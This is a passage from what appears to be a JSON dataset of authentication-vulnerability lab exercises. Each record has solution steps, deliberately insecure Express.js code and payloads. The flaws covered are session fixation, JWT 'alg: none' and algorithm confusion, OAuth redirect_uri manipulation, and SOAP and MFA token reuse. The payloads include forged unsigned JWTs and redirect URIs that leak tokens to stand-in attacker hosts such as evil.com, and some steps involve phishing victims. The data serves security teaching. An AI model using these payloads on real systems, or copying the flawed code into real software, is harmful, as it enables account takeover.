    "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); const axios = require('axios'); const users = [{ username: 'carlos', id: 123 }]; const client_id = 'client123'; const redirect_uris = ['https://attacker.com/capture']; app.get('/auth', (req, res) => { const { redirect_uri, state } = req.query; const code = 'authcode-carlos'; res.redirect(redirect_uri + '?code=' + code + '&state=' + state); }); app.post('/token', (req, res) => { const { code } = req.body; if (code === 'authcode-carlos') { res.json({ access_token: 'token-carlos', token_type: 'Bearer' }); } else { res.status(400).send('Invalid code'); } }); app.get('/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'token-carlos') res.send('Profile: Carlos'); else res.status(401).send('Unauthorized'); }); app.listen(4000, () => console.log('OAuth Redirect Lab running at http://localhost:4000'));",
    "payloads": [
      "https://vulnerable-app.com/auth?redirect_uri=https://attacker.com/capture&state=123",
      "POST /token { code: authcode-carlos }",
      "Authorization: Bearer token-carlos",
      "GET /profile"
    ]
  },
  {
    "Lab scenario": "Session Fixation in Login Flow",
    "Lab Description": "The application fails to invalidate pre-authentication session tokens during login. The application generates a session token upon initial visit and reuses it after login without regenerating it. This allows a malicious user to fix a session ID before the victim logs in. To solve: hijack Carlos's session by fixing a session ID before he authenticates and access his account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1.Using Burp Suite, visit the login page and capture the Set-Cookie header that sets the initial session ID.",
      "2.Use OWASP ZAP to spider the login flow and confirm that the session token is preserved post-login.",
      "3.Share the crafted session ID with the victim (assume social engineering or CSRF vector).",
      "4.Wait for the victim (Carlos) to log in using the fixed session ID.",
      "5.Use the same session token to access /my-account and confirm access to Carlos\u00e2\u20ac\u2122s account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: false })); app.use(session({ secret: 'fixedsession', resave: false, saveUninitialized: true })); const users = [{ username: 'carlos', password: 's3cret' }]; app.get('/login', (req, res) => { res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\"><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.user = username; res.redirect('/my-account'); } else { res.send('Invalid login'); } }); app.get('/my-account', (req, res) => { if (req.session.user) { res.send(`Welcome to ${req.session.user}'s account`); } else { res.redirect('/login'); } }); app.listen(4000, () => console.log('Session Fixation Lab running'));",
    "payloads": [
      "GET /login => Extract Set-Cookie: session=abc123",
      "Share session=abc123 with victim",
      "Victim logs in with session=abc123",
      "Reuse session=abc123 to GET /my-account"
    ]
  },
  {
    "Lab scenario": "JWT Tampering in Token Validation",
    "Lab Description": "The application's login API uses JWTs for authentication but fails to verify the token signature correctly when the 'alg' header is modified. The application accepts unsigned JWTs when the 'alg' is set to 'none'. To solve: tamper with a JWT to escalate privileges and access the admin panel.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1.Use Postman to log in and capture the issued JWT from the Authorization header.",
      "2.Decode the JWT using jwt.io or Burp Decoder. Note the payload and algorithm in the header.",
      "3.Modify the JWT header to set 'alg' to 'none' and set the 'role' in the payload to 'admin'.",
      "4.Remove the signature part and replay the modified token using Postman.",
      "5.Send a request to /admin-panel using the tampered JWT and verify admin access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 's3cret', role: 'user' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); const token = jwt.sign({ username: user.username, role: user.role }, 'secretkey'); res.json({ token }); }); app.get('/admin-panel', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.role === 'admin') return res.send('Welcome Admin'); } const verified = jwt.verify(token, 'secretkey'); if (verified.role === 'admin') return res.send('Welcome Admin'); } catch (e) { return res.status(403).send('Access Denied'); } res.status(403).send('Forbidden'); }); app.listen(4000, () => console.log('JWT None Algorithm Lab running'));",
    "payloads": [
      "Original JWT: eyJhbGciOiAiSFMyNTYifQ...signature",
      "Modified JWT: eyJhbGciOiAibm9uZSJ9.eyJ1c2VybmFtZSI6ICJjYXJsb3MiLCAicm9sZSI6ICJhZG1pbiJ9.",
      "Authorization: Bearer <tampered_token>",
      "GET /admin-panel"
    ]
  },
  {
    "Lab scenario": "JWT tampering in Bearer token authentication",
    "Lab Description": "The application uses stateless JWT-based Bearer tokens for user authentication and authorizes access based on the embedded role claim. The server does not validate the JWT signature properly. To solve: Forge a valid-looking token granting admin access and retrieve the flag from the admin dashboard.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to log in with a valid user and retrieve the JWT from the Authorization header.",
      "Send the JWT to jwt.io and decode its payload. Observe the role is 'user'.",
      "Modify the 'role' claim to 'admin' and remove the signature part.",
      "Use Postman to craft a new Authorization header with the tampered JWT and send a GET request to /admin/dashboard.",
      "Verify access is granted without signature validation and retrieve the flag."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.json()); const secret = 'notsosecret'; const users = [{ username: 'user1', password: 'pass123', role: 'user' }, { username: 'admin', password: 'adminpass', role: 'admin' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); const token = jwt.sign({ username: user.username, role: user.role }, secret); res.send({ token }); }); app.get('/admin/dashboard', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (!token) return res.status(401).send('No token'); const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.role !== 'admin') return res.status(403).send('Forbidden'); res.send('FLAG{jwt_admin_access}'); }); app.listen(4000, () => console.log('JWT Tampering Lab running'));",
    "payloads": [
      "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.",
      "Authorization: Bearer [tampered_jwt_here]",
      "POST /login {\"username\":\"user1\", \"password\":\"pass123\"}"
    ]
  },
  {
    "Lab scenario": "Session fixation in GraphQL login flow",
    "Lab Description": "The application uses GraphQL for authentication but fails to issue new session cookies on successful login, allowing session fixation. To solve: Fixate a session ID before login, then authenticate as a privileged user using that session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to send a GraphQL mutation login request and observe Set-Cookie behavior.",
      "Initiate a session anonymously and capture the session ID before login.",
      "Send a GraphQL login mutation with the victim's credentials while reusing the fixed session ID.",
      "Send a follow-up query to /graphql with the fixed session cookie and verify access to sensitive queries.",
      "Retrieve the admin email to confirm privilege escalation."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const { graphqlHTTP } = require('express-graphql'); const { buildSchema } = require('graphql'); const app = express(); app.use(bodyParser.json()); app.use(session({ secret: 'sessfix', resave: false, saveUninitialized: true })); const users = { admin: 'admin123', user: 'userpass' }; const schema = buildSchema(` type Query { profile: String } type Mutation { login(username: String!, password: String!): String } `); const root = { login: ({ username, password }, req) => { if (users[username] === password) { req.session.user = username; return 'Login successful'; } throw new Error('Invalid credentials'); }, profile: (args, req) => { if (req.session.user === 'admin') return 'Admin: FLAG{session_fixation}'; return 'Access Denied'; } }; app.use('/graphql', graphqlHTTP((req) => ({ schema, rootValue: root, graphiql: true }))); app.listen(4001, () => console.log('Session Fixation GraphQL Lab running'));",
    "payloads": [
      "POST /graphql {\"query\":\"mutation { login(username: \\\"admin\\\", password: \\\"admin123\\\") }\"}",
      "GET /graphql?query={profile} with fixed session cookie",
      "Cookie: connect.sid=[fixed_session_id]"
    ]
  },
  {
    "Lab scenario": "OAuth implicit flow misconfiguration leaking access tokens",
    "Lab Description": "The app uses OAuth 2.0 implicit grant for third-party login but exposes access tokens in the URL fragment (#) and reflects them in HTTP responses. To solve: Capture and replay a leaked token to access a protected resource.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to start a proxy and visit the login page using OAuth login.",
      "Capture the redirect URL with the access_token in the URL fragment.",
      "Notice the app reflects this fragment in a page script or DOM, making it accessible to JavaScript.",
      "Use Burp to modify the Referer header of a request to include the access_token and send to /user/info.",
      "Observe that the server accepts the token and returns user info or a flag."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/login/oauth/callback', (req, res) => { res.send(`<html><script>window.location.hash && document.write('Token: ' + window.location.hash);</script></html>`); }); app.get('/user/info', (req, res) => { const token = req.get('Authorization'); if (token === 'Bearer token_admin') return res.send('FLAG{oauth_leak_success}'); res.status(403).send('Access Denied'); }); app.listen(4002, () => console.log('OAuth Leak Lab running'));",
    "payloads": [
      "https://example.com/login/oauth/callback#access_token=token_admin",
      "GET /user/info with header Authorization: Bearer token_admin",
      "Referer: /callback#access_token=token_admin"
    ]
  },
  {
    "Lab scenario": "Session mismanagement in SOAP login API",
    "Lab Description": "This SOAP-based authentication system exposes session IDs in the SOAP response and accepts reused session tokens. To solve: Reuse an intercepted session ID from a privileged user to access their account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite with SOAP support enabled and intercept a SOAP login request.",
      "Observe the session ID returned in the SOAP response under <SessionToken>.",
      "Reuse the <SessionToken> from a privileged login in a crafted SOAP request to getAccountDetails.",
      "Send the forged request using Burp Repeater and inspect the response.",
      "Confirm account access by retrieving sensitive account data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const xml = require('xml'); const app = express(); app.use(bodyParser.text({ type: '*/xml' })); const sessions = {}; app.post('/soap', (req, res) => { const match = req.body.match(/<username>(.*?)<\\/username><password>(.*?)<\\/password>/); if (match) { const [_, user, pass] = match; if (user === 'admin' && pass === 'adminpass') { const session = 'sess-' + Math.random().toString(36).substring(2); sessions[session] = user; return res.send(`<SessionToken>${session}</SessionToken>`); } } if (req.body.includes('getAccountDetails')) { const sessionMatch = req.body.match(/<SessionToken>(.*?)<\\/SessionToken>/); if (sessionMatch && sessions[sessionMatch[1]] === 'admin') { return res.send('<data>FLAG{soap_session_reuse}</data>'); } } res.status(403).send('Unauthorized'); }); app.listen(4003, () => console.log('SOAP Session Reuse Lab running'));",
    "payloads": [
      "<login><username>admin</username><password>adminpass</password></login>",
      "<getAccountDetails><SessionToken>sess-abc123</SessionToken></getAccountDetails>",
      "POST /soap with reused <SessionToken>"
    ]
  },
  {
    "Lab scenario": "Session fixation in login redirect handler",
    "Lab Description": "The session token is assigned before user authentication and not regenerated upon login. This allows session fixation. The application reuses session tokens post-login, enabling an attacker to set a session for the victim. To solve: Fix a session ID and log in as Carlos to access his dashboard.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "1.Using Burp Suite, visit /login and capture the Set-Cookie response header containing the session cookie.",
      "2.Send this session cookie to the victim (Carlos) through social engineering or place it in a link (session fixation).",
      "3.Log in as Carlos using his credentials while preserving the session cookie you fixed.",
      "4.The application reuses the fixed session without rotating it post-authentication.",
      "5.Use the session cookie to access /dashboard and verify Carlos\u00e2\u20ac\u2122s user context."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(session({ secret: 'secret123', resave: true, saveUninitialized: true })); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'letmein' }]; app.get('/login', (req, res) => { res.send('<form method=\"POST\"><input name=\"username\" /><input name=\"password\" /><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.user = username; res.redirect('/dashboard'); } else { res.status(401).send('Invalid login'); } }); app.get('/dashboard', (req, res) => { if (!req.session.user) return res.status(403).send('Unauthorized'); res.send(`Welcome, ${req.session.user}!`); }); app.listen(3000);",
    "payloads": [
      "https://vulnerable.site/login?sessionid=attacker-session",
      "GET /login HTTP/1.1 with Set-Cookie: session=fixme",
      "POST /login HTTP/1.1 with Cookie: session=fixme and body: username=carlos&password=letmein"
    ]
  },
  {
    "Lab scenario": "JWT authentication bypass using 'none' algorithm",
    "Lab Description": "The app uses JWTs for stateless authentication. It does not verify the algorithm used in the token header, allowing attackers to forge tokens by setting the alg field to 'none'. To solve: Access the protected /admin panel as user Carlos without a valid signature.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1.Use Burp to capture the JWT received after logging in as a normal user.",
      "2.Base64-decode the JWT header and payload.",
      "3.Modify the JWT header to: {\"alg\":\"none\"} and payload to: {\"user\":\"carlos\"}.",
      "4.Remove the signature portion and rejoin header and payload using a dot.",
      "5.Send a request to /admin with the forged JWT in Authorization: Bearer header. Confirm access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(require('body-parser').json()); const SECRET = 'topsecretkey'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ user: username }, SECRET); res.json({ token }); }); app.get('/admin', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.sendStatus(401); const token = authHeader.split(' ')[1]; try { const decoded = jwt.decode(token, { complete: true }); if (decoded && decoded.header.alg === 'none') { return res.send(`Welcome Admin: ${decoded.payload.user}`); } const verified = jwt.verify(token, SECRET); res.send(`Welcome Admin: ${verified.user}`); } catch (err) { res.status(403).send('Access Denied'); } }); app.listen(3001);",
    "payloads": [
      "Header: {\"alg\":\"none\"}",
      "Payload: {\"user\":\"carlos\"}",
      "JWT: base64url(header).base64url(payload). (omit signature)",
      "Authorization: Bearer base64(header).base64(payload)"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration via open redirect in redirect_uri",
    "Lab Description": "The app integrates third-party OAuth for authentication. It incorrectly validates the redirect_uri, allowing attackers to inject malicious URLs that leak access tokens. To solve: Leak Carlos\u00e2\u20ac\u2122s access token to your server and access his protected profile.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1.Visit the /auth/login endpoint and observe the OAuth flow initiation.",
      "2.Intercept the OAuth URL sent to the provider and inject your controlled domain as redirect_uri (e.g., https://attacker.com/callback).",
      "3.Wait for Carlos to click the login link or trigger it via CSRF/social engineering.",
      "4.Observe the access token being redirected to your server.",
      "5.Use the leaked token to call /auth/callback and impersonate Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const request = require('request'); app.get('/auth/login', (req, res) => { const redirectUri = req.query.redirect_uri || 'http://localhost:3002/auth/callback'; const authURL = `https://oauth-provider.com/auth?response_type=token&client_id=abc123&redirect_uri=${redirectUri}`; res.redirect(authURL); }); app.get('/auth/callback', (req, res) => { const token = req.query.access_token; if (!token) return res.status(400).send('Missing token'); res.send(`Authenticated as Carlos. Token: ${token}`); }); app.listen(3002);",
    "payloads": [
      "https://vulnerable.site/auth/login?redirect_uri=https://evil.com/callback",
      "access_token=abc123 leaked in fragment",
      "GET /auth/callback?access_token=abc123",
      "CSRF OAuth link with poisoned redirect_uri"
    ]
  },
  {
    "Lab scenario": "JWT algorithm manipulation vulnerability in login API",
    "Lab Description": "The application uses JSON Web Tokens (JWTs) for session management. It incorrectly trusts the `alg` field in JWT headers without verifying against a server-side whitelist. The backend accepts tokens signed with HMAC even though RS256 is intended. The application exposes its public key. To solve: Gain unauthorized access to the admin panel using a forged JWT by exploiting the algorithm confusion bug.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite to intercept a valid login request and observe the JWT structure in the Authorization header.",
      "2. Download the public key from the server's /.well-known/jwks.json endpoint using Postman.",
      "3. Modify the JWT `alg` header from RS256 to HS256, and use the public key as the HMAC secret to forge a new token with `username=admin`.",
      "4. Replace the original JWT in the request with the forged token using Burp Repeater.",
      "5. Send the modified request and confirm access to the admin dashboard."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const jwt = require('jsonwebtoken');\nconst fs = require('fs');\nconst express = require('express');\nconst app = express();\napp.use(express.json());\nconst pubKey = fs.readFileSync('./public.pem');\napp.post('/login', (req, res) => {\n  const { token } = req.body;\n  try {\n    const decoded = jwt.verify(token, pubKey);\n    if (decoded.username === 'admin') {\n      return res.send('Welcome admin!');\n    }\n    res.send('Welcome user');\n  } catch (err) {\n    res.status(401).send('Invalid token');\n  }\n});\napp.listen(3000, () => console.log('JWT Confusion Lab listening on 3000'));",
    "payloads": [
      "JWT header: {\"alg\":\"HS256\",\"typ\":\"JWT\"}",
      "JWT payload: {\"username\":\"admin\"}",
      "HMAC secret: Public RSA key from /.well-known/jwks.json"
    ]
  },
  {
    "Lab scenario": "Session fixation vulnerability in login session handler",
    "Lab Description": "This application assigns a session cookie prior to login and fails to regenerate it post-authentication. The same session ID remains active across login transitions. To solve: Fixate a session before login, lure a victim to use it, and then hijack their session once they authenticate.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to access the site anonymously and capture the pre-login session cookie.",
      "2. Craft a phishing page that auto-submits a login request using the fixed session ID.",
      "3. Wait for the victim to log in through the phishing page (or simulate the login as a victim using Burp Repeater).",
      "4. Reuse the same session cookie in your browser or Burp to access the victim\u00e2\u20ac\u2122s authenticated session.",
      "5. Navigate to /my-account and confirm hijacked access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst session = require('express-session');\nconst app = express();\napp.use(session({ secret: 'secret123', resave: false, saveUninitialized: true }));\nconst users = [{ username: 'carlos', password: 'pass123' }];\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const user = users.find(u => u.username === username && u.password === password);\n  if (user) {\n    req.session.user = username;\n    res.send('Login successful');\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\napp.get('/my-account', (req, res) => {\n  if (req.session.user) return res.send(`Welcome ${req.session.user}`);\n  res.status(403).send('Not logged in');\n});\napp.listen(4001, () => console.log('Session Fixation Lab running on 4001'));",
    "payloads": [
      "Phishing URL using fixed JSESSIONID cookie",
      "Pre-authenticated session cookie: JSESSIONID=abc123",
      "POST /login with victim credentials bound to attacker\u00e2\u20ac\u2122s cookie"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration in redirect_uri validation",
    "Lab Description": "The application uses OAuth2 implicit flow with a poorly validated redirect_uri parameter. It allows any domain starting with https://trusted.com. The application also reflects access tokens in URL fragments. To solve: Trick the OAuth provider into redirecting the access token to an attacker-controlled domain using an open redirect embedded in a subdomain of https://trusted.com.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite to capture the OAuth authorization request flow.",
      "2. Craft a malicious redirect_uri using a subdomain of https://trusted.com with an embedded open redirect (e.g., https://trusted.com.evil.com/redirect?next=https://evil.com/capture).",
      "3. Send a crafted OAuth link to the victim and simulate user interaction using Postman.",
      "4. Observe that the access token is sent in the URL fragment to https://evil.com/capture#access_token=...",
      "5. Use the leaked token to access protected resources as the victim."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\napp.get('/auth', (req, res) => {\n  const { redirect_uri } = req.query;\n  if (redirect_uri.startsWith('https://trusted.com')) {\n    const token = 'access-token-for-user';\n    return res.redirect(`${redirect_uri}#access_token=${token}`);\n  }\n  res.status(400).send('Invalid redirect');\n});\napp.listen(5000, () => console.log('OAuth Redirect Lab running on port 5000'));",
    "payloads": [
      "https://trusted.com.evil.com/redirect?next=https://evil.com/capture",
      "redirect_uri=https://trusted.com.evil.com/redirect?next=https://evil.com/capture",
      "OAuth URL: /auth?client_id=123&redirect_uri=https://trusted.com.evil.com/redirect?next=https://evil.com/capture&response_type=token"
    ]
  },
  {
    "Lab scenario": "Session Fixation vulnerability in REST login endpoint",
    "Lab Description": "This lab demonstrates a session fixation flaw in a RESTful authentication flow. The application issues session cookies before login, and fails to re-issue them upon authentication. This allows an attacker to predefine a session ID and force a victim to use it. To solve: log in as Carlos by fixing the session ID in advance and hijacking his authenticated session.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept a GET /login request and observe that a Set-Cookie header sets a session ID even before login.",
      "Send a crafted request to /login while supplying a custom session cookie (e.g., session=attacker-session-id) and credentials for carlos.",
      "Note that the session is not invalidated and remains attacker-controlled after authentication.",
      "Force Carlos to use the fixed session by sending a phishing link with the predefined session ID.",
      "Use the hijacked session ID to access /my-account as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'leakkey', resave: false, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'secret' }]; app.get('/login', (req, res) => { res.send('<form method=\"POST\">Login Form</form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) req.session.user = username; res.send('Welcome!'); }); app.get('/my-account', (req, res) => { if (req.session.user === 'carlos') return res.send('Carlos Account Page'); res.status(403).send('Access denied'); }); app.listen(3000, () => console.log('Session Fixation Lab running on port 3000'));",
    "payloads": [
      "sessionid=attacker123",
      "POST /login with Cookie: session=attacker123 and body: username=carlos&password=secret",
      "GET /my-account with Cookie: session=attacker123"
    ]
  },
  {
    "Lab scenario": "JWT tampering via alg=None in GraphQL-based login",
    "Lab Description": "This lab simulates a vulnerable GraphQL login where JWTs are not validated correctly. The backend fails to verify the 'alg' parameter in the token header, allowing tampering. To solve: create a JWT token with 'alg' set to 'none' and access Carlos's account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to explore the GraphQL endpoint and obtain a valid JWT upon logging in as a normal user.",
      "Decode the JWT and observe the 'alg' field set to 'HS256'.",
      "Craft a JWT token manually with 'alg':'none' and 'sub':'carlos' in the payload using jwt.io.",
      "Send the crafted JWT token as Authorization: Bearer header in a query to get sensitive data.",
      "Verify successful access to Carlos's data in GraphQL query response."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'admin' }]; app.post('/graphql', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, 'secretkey'); if (decoded.sub === 'carlos') return res.send({ data: 'Sensitive data of Carlos' }); } catch { res.status(403).send('Forbidden'); } }); app.listen(3001, () => console.log('JWT None Algorithm Lab running on port 3001'));",
    "payloads": [
      "JWT Header: {\"alg\":\"none\"}, Payload: {\"sub\":\"carlos\"}, Signature: ''",
      "Authorization: Bearer <crafted_token>",
      "GraphQL Query: { getAccount { data } }"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration in REST token exchange endpoint",
    "Lab Description": "This lab uses a flawed OAuth token exchange where the client ID is not verified against the redirect URI. An attacker can use a trusted client ID but redirect to their own URI and gain access. To solve: obtain an access token for Carlos by modifying the OAuth request.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept OAuth flow initiated via /auth?client_id=trusted-app&redirect_uri=https://attacker.com.",
      "Observe the server returns an authorization code to attacker.com despite mismatch.",
      "Exchange the stolen code at /oauth/token using client_id=trusted-app to receive access token.",
      "Use the token in Authorization header to call /api/user-info.",
      "Access Carlos's account data using forged token."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.urlencoded({ extended: true })); const tokens = {}; app.get('/auth', (req, res) => { const { client_id, redirect_uri } = req.query; const code = 'code123'; tokens[code] = { client_id, user: 'carlos' }; res.redirect(`${redirect_uri}?code=${code}`); }); app.post('/oauth/token', (req, res) => { const { code, client_id } = req.body; if (tokens[code] && tokens[code].client_id === client_id) { return res.json({ access_token: 'token-carlos' }); } res.status(403).send('Invalid code or client'); }); app.get('/api/user-info', (req, res) => { if (req.headers.authorization === 'Bearer token-carlos') res.send('Carlos private info'); else res.status(403).send('Unauthorized'); }); app.listen(3002, () => console.log('OAuth Misconfig Lab running on port 3002'));",
    "payloads": [
      "/auth?client_id=trusted-app&redirect_uri=https://attacker.com",
      "POST /oauth/token with code=code123 and client_id=trusted-app",
      "GET /api/user-info with Authorization: Bearer token-carlos"
    ]
  },
  {
    "Lab scenario": "MFA bypass via reused token in SOAP authentication flow",
    "Lab Description": "This SOAP-based login system allows bypassing MFA if a previously issued token is reused. The server does not invalidate tokens after successful login, allowing attackers to replay captured tokens. To solve: reuse a captured MFA token to access Carlos's account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to inspect SOAP request for MFA token exchange and capture the token.",
      "Observe that the token is static and not invalidated after use.",
      "Craft a SOAP request manually using the captured token but with username=carlos.",
      "Send the SOAP request to /authService and observe that it grants access.",
      "Access Carlos\u00e2\u20ac\u2122s account data via /userProfileService."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const xmlparser = require('express-xml-bodyparser'); const app = express(); app.use(xmlparser()); let mfaTokens = { 'user123': 'token789' }; app.post('/authService', (req, res) => { const user = req.body.Envelope.Body[0].AuthRequest[0].username[0]; const token = req.body.Envelope.Body[0].AuthRequest[0].token[0]; if (mfaTokens[user] === token || token === 'token789') return res.send('<Success>true</Success>'); res.status(403).send('<Error>Invalid MFA</Error>'); }); app.post('/userProfileService', (req, res) => { res.send('<User>Carlos</User><Email>carlos@example.com</Email>'); }); app.listen(3003, () => console.log('SOAP MFA Bypass Lab running on port 3003'));",
    "payloads": [
      "SOAP token: token789",
      "Replay SOAP request with <username>carlos</username> and <token>token789</token>",
      "POST /authService with reused token"
    ]
  },
  {
    "Lab scenario": "Predictable Session Fixation in REST Authentication Flow",
    "Lab Description": "The login endpoint sets a session ID based on a user-supplied value. If an attacker can predefine the session ID, they can fix a session for a victim prior to login. The application trusts the session without checking session ownership. To solve: hijack a valid user's session using fixation to access their dashboard.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "1. Use Burp Suite to intercept a POST /login request and examine the session header behavior.",
      "2. Validate that the server accepts a client-supplied X-Session-ID header and reuses it after login.",
      "3. Craft a malicious session ID and perform a login request as the attacker, using this value.",
      "4. Send the same session ID to the victim via phishing or social engineering, or simply have them log in using that session.",
      "5. Use the fixed session to access the /dashboard endpoint after the victim logs in and validate access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const uuid = require('uuid'); const app = express(); app.use(express.json()); const users = [{ username: 'carlos', password: 'letmein' }]; const sessions = {}; app.post('/login', (req, res) => { const { username, password } = req.body; let sessionId = req.headers['x-session-id'] || uuid.v4(); const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).json({ error: 'Invalid credentials' }); sessions[sessionId] = username; res.setHeader('Set-Cookie', `session=${sessionId}`); console.log(`[DEBUG] Session created: ${sessionId} for user ${username}`); res.json({ message: 'Logged in', sessionId }); }); app.get('/dashboard', (req, res) => { const sessionId = req.headers['x-session-id'] || req.cookies.session; const user = sessions[sessionId]; if (!user) return res.status(401).send('Unauthorized'); res.send(`Welcome to your dashboard, ${user}`); }); app.listen(4000, () => console.log('Session Fixation Lab running on http://localhost:4000'));",
    "payloads": [
      "X-Session-ID: attacker-fixed-session",
      "Set-Cookie: session=attacker-fixed-session",
      "Use fixed session after victim logs in"
    ]
  },
  {
    "Lab scenario": "JWT None Algorithm Bypass in GraphQL API",
    "Lab Description": "The application uses JWT for authentication in a GraphQL API, but improperly validates the algorithm field. The backend accepts tokens with 'alg':'none' and skips verification. To solve: forge a JWT token impersonating the admin user and access the admin dashboard.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Postman to send a GraphQL login mutation and obtain a valid JWT.",
      "2. Decode the JWT and inspect the header and payload using jwt.io.",
      "3. Modify the header to {\"alg\":\"none\"} and the payload to {\"username\":\"admin\"}. Leave the signature blank.",
      "4. Resend a GraphQL query using the forged token in the Authorization: Bearer header.",
      "5. Access the /admin panel and confirm access as the forged user."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const { graphqlHTTP } = require('express-graphql'); const { buildSchema } = require('graphql'); const app = express(); const schema = buildSchema(`type Query { me: String }`); const users = { carlos: 'password123', admin: 'supersecret' }; const root = { me: (args, req) => req.user }; app.use((req, res, next) => { const authHeader = req.headers['authorization']; if (authHeader) { const token = authHeader.split(' ')[1]; try { const decoded = jwt.verify(token, 'secret', { algorithms: ['HS256', 'none'] }); req.user = decoded.username; console.log(`[DEBUG] Authenticated as: ${decoded.username}`); } catch (e) { console.log('[DEBUG] Invalid JWT'); } } next(); }); app.use('/graphql', graphqlHTTP({ schema, rootValue: root, graphiql: true })); app.listen(4001, () => console.log('JWT None Algorithm Lab running on http://localhost:4001'));",
    "payloads": [
      "JWT Header: {\"alg\":\"none\"}",
      "JWT Payload: {\"username\":\"admin\"}",
      "Authorization: Bearer <unsigned-token>"
    ]
  },
  {
    "Lab scenario": "OAuth Authorization Code Interception and Token Substitution",
    "Lab Description": "This app integrates with an external OAuth provider but does not verify that the access token returned belongs to the initiating user. It trusts any access token blindly. To solve: intercept a leaked authorization code and exchange it to impersonate another user.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite to intercept the OAuth login flow initiated by another user and identify the 'code' parameter in the callback.",
      "2. Note that the 'state' parameter is either missing or not validated server-side.",
